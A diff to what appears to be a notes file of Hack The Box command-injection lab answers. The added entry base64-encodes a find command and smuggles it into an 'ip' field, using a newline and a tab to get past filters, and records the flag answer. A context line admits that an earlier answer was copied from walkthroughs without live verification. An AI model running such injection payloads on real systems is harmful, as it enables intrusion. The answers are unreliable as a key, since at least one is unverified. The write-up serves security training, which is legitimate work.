@@ -248,3 +248,12 @@ Payload (blacklist bypass with quotes + ${PATH:0:1} for '/'):
 ANSWER: HTB{b451c_f1l73r5_w0n7_570p_m3}
 NOTE: could not re-verify live - the lab IP stopped responding from the sandbox
       (connection reset on all lab targets); answer taken from multiple walkthroughs.
+
+---
+# Command Injections - Advanced Command Obfuscation (target 154.57.164.79:39808)
+Q: output of: find /usr/share/ | grep root | grep mysql | tail -n 1
+Technique: Base64 obfuscation of the whole command:
+  echo -n "find /usr/share/ | grep root | grep mysql | tail -n 1" | base64
+  -> ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
+  payload: ip=127.0.0.1%0Abash<<<$(base64%09-d<<<ZmluZCA...IDE=)
+ANSWER: /usr/share/mysql/debian_create_root_user.sql
